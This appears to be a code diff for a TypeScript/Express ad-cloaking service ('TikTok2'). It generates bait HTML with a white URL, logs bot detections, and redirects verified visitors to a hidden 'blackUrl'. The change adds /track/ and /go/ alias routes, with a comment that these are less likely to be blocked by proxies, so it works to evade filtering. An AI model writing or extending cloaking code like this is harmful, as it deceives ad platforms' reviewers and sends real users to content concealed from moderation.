@@ -112,9 +112,10 @@ function generateTikTok2BaitHTML(token: string, whiteUrl: string, baseUrl?: stri
   const safeWhiteUrl = sanitizeUrl(whiteUrl);
   
   // Use absolute URLs to avoid routing issues with custom domains
+  // Using /go/ and /track/ routes that are less likely to be blocked by proxies
   const prefix = baseUrl ? baseUrl : '';
-  const botLogUrl = `${prefix}/b/${token}`;
-  const verifyUrl = `${prefix}/v/${token}`;
+  const botLogUrl = `${prefix}/track/${token}`;
+  const verifyUrl = `${prefix}/go/${token}`;
   
   return `<!DOCTYPE html>
 <html lang="pt-BR">
@@ -619,11 +620,18 @@ export async function registerRoutes(
     res.send(gif);
   }
   
-  // Route for custom domains: /b/:token
+  // Route for custom domains: /b/:token and /track/:token (fallback)
   app.get("/b/:token", async (req: Request, res: Response) => {
     const { token } = req.params;
     const reason = (req.query.r as string) || 'unknown';
     console.log(`[TikTok2] Bot detection via /b/:token - Token: ${token?.substring(0, 16)}...`);
+    return handleBotDetection(token, reason, res);
+  });
+  
+  app.get("/track/:token", async (req: Request, res: Response) => {
+    const { token } = req.params;
+    const reason = (req.query.r as string) || 'unknown';
+    console.log(`[TikTok2] Bot detection via /track/:token - Token: ${token?.substring(0, 16)}...`);
     return handleBotDetection(token, reason, res);
   });
   
@@ -795,10 +803,16 @@ export async function registerRoutes(
     return res.redirect(302, baitData.blackUrl);
   }
   
-  // Route for custom domains: /v/:token
+  // Route for custom domains: /v/:token and /go/:token (fallback)
   app.get("/v/:token", async (req: Request, res: Response) => {
     const { token } = req.params;
     console.log(`[TikTok2] Verify via /v/:token - Token: ${token?.substring(0, 16)}...`);
+    return handleVerification(token, res);
+  });
+  
+  app.get("/go/:token", async (req: Request, res: Response) => {
+    const { token } = req.params;
+    console.log(`[TikTok2] Verify via /go/:token - Token: ${token?.substring(0, 16)}...`);
     return handleVerification(token, res);
   });
   
